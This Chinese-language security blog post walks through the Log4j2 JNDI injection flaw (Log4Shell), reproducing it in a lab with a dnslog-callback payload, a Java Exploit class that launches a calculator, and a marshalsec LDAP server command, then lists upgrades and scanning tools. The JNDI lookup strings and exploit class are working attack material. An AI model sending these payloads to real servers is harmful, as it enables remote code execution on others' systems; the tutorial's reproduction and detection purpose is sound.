对于一个能养活安全工程师的核弹级漏洞，就非常有必要研究一番了，希望能抛砖引玉。

![1645601467_6215e2bba39d968dbf667.png!small](https://image.3001.net/images/20220223/1645601467_6215e2bba39d968dbf667.png!small)

## 简介

### I 漏洞描述

Apache Log4j 是 Apache 的一个开源项目，Apache log4j-2 是 Log4j
的升级，我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。

Log4j-2中存在JNDI注入漏洞，当程序将用户输入的数据日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。

### II 漏洞原理

当log4j打印的日志内容中包括
${jndi:ldap://ip}时，程序就会通过Idap协议访问ip这个地址，然后ip就会返回一个包含Java代码的class文件的地址，然后程序再通过返回的地址下载class文件并执行。

###  **III 影响范围**

Apache Log4j 2.x < 2.15.0-rc2。

##  **漏洞验证：**

![1645601798_6215e406ba2ea953b6c36.png!small?1645601798887](https://image.3001.net/images/20220223/1645601798_6215e406ba2ea953b6c36.png!small?1645601798887)

**Docker漏洞环境搭建完成**![1645601841_6215e431b41c33c76ca93.png!small?1645601841688](https://image.3001.net/images/20220223/1645601841_6215e431b41c33c76ca93.png!small?1645601841688)

**访问<http://ip:8080/webstudy/>显示**![1645601875_6215e45315c8c05bd4c86.png!small?1645601874982](https://image.3001.net/images/20220223/1645601875_6215e45315c8c05bd4c86.png!small?1645601874982)

**页面抓包**![1645601896_6215e468cca4bb845577e.png!small?1645601896719](https://image.3001.net/images/20220223/1645601896_6215e468cca4bb845577e.png!small?1645601896719)

 **Change request POST
method**![1645601932_6215e48cec215e9581197.png!small?1645601932939](https://image.3001.net/images/20220223/1645601932_6215e48cec215e9581197.png!small?1645601932939)

**获取子域名qsydek.dnslog.cn**![1645601959_6215e4a7d9134d8ed0195.png!small?1645601959917](https://image.3001.net/images/20220223/1645601959_6215e4a7d9134d8ed0195.png!small?1645601959917)

**Post传参c=${jndi:ldap://qsydek.dnslog.cn/exp}**![1645601985_6215e4c12e6e156556447.png!small?1645601985231](https://image.3001.net/images/20220223/1645601985_6215e4c12e6e156556447.png!small?1645601985231)

 **漏洞验证成功**

##  **漏洞复现：**

> <dependencies>  
> <dependency>  
> <groupId>org.apache.logging.log4j</groupId>  
> <artifactId>log4j-core</artifactId>  
> <version>2.14.1</version>  
> </dependency>  
> </dependencies>

 **创建maven项目，导入log4j的依赖**

> import org.apache.logging.log4j.LogManager;  
> import org.apache.logging.log4j.Logger;  
> class LogTest {  
> public static final Logger logger = LogManager.getLogger();  
> public static void main(String[] args) {  
> logger.error("${jndi:ldap://localhost:1389/Exploit}");  
> }  
> }

 **构造poc**

> public class Exploit {  
> static {  
> System.err.println("Pwned");  
> try {  
> String cmd = "calc";  
> Runtime.getRuntime().exec(cmd);  
> } catch ( Exception e ) {  
> e.printStackTrace();  
> }  
> }  
> }

 **构造Exploit.java**

> javac Exploit.java

 **编译成class文件**

> java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer
> "http://127.0.0.1:8888/#Exploit"

**开启LDAP服务**![1645602360_6215e638d694334c28b0d.png!small?1645602362234](https://image.3001.net/images/20220223/1645602360_6215e638d694334c28b0d.png!small?1645602362234)

 **运行Log4j.java，PWN!**

## 漏洞修复

1>升级Apache Log4j2所有相关应用到最新版。

## 其他检测手段

 **1 > Log4j-scan 一款用于查找log4j2漏洞的python脚本，支持url检测，支持HTTP请求头和POST数据参数进行模糊测试。**

> https://github.com/fullhunt/log4j-scan

![1645715696_6217a0f0774a7d0adba17.png!small?1645715696742](https://image.3001.net/images/20220224/1645715696_6217a0f0774a7d0adba17.png!small?1645715696742)

### 特征:

>  **支持 URL 列表；**
>
>  **对 60 多个 HTTP 请求标头进行模糊测试（不仅仅是以前看到的工具中的 3-4 个标头）；**
>
>  **对 HTTP POST 数据参数进行模糊测试；**
>
>  **对 JSON 数据参数进行模糊测试；**
>
>  **支持用于漏洞发现和验证的 DNS 回调；**
>
>  **WAF 绕过有效负载。**

 **2 >Log4j2
burp被动扫描插件**![1645716351_6217a37fa89387071f3d5.png!small?1645716351910](https://image.3001.net/images/20220224/1645716351_6217a37fa89387071f3d5.png!small?1645716351910)

通过插件的方式，将Log4j2漏洞检测能力集成到burp

3> **AWVS扫描log4j2漏洞**

![1645716602_6217a47a31083f45e11a0.png!small?1645716602386](https://image.3001.net/images/20220224/1645716602_6217a47a31083f45e11a0.png!small?1645716602386)

AWVS14最新版本支持Log4j2漏洞检测，支持批量扫描

 **4 >制品级Log4j2漏洞检测**

![1645716734_6217a4fedbd47c29da4eb.png!small?1645716735107](https://image.3001.net/images/20220224/1645716734_6217a4fedbd47c29da4eb.png!small?1645716735107)

支持 Jar/Ear/War包上传，一键上传即可获取到检测结果（腾讯安全binAuditor）

5> **Log4j2 本地检测**

![1645716875_6217a58b8529248495fc0.png!small?1645716875861](https://image.3001.net/images/20220224/1645716875_6217a58b8529248495fc0.png!small?1645716875861)
提取出来的Log4j2本地检测工具，可快速发现当前服务器存在风险的 log4j2 应用

随着时间的推移，这个Log4j2中的RCE漏洞可能需要好几年的时间才能得到解决，加强企业的应急检测能力就是重中之重了。

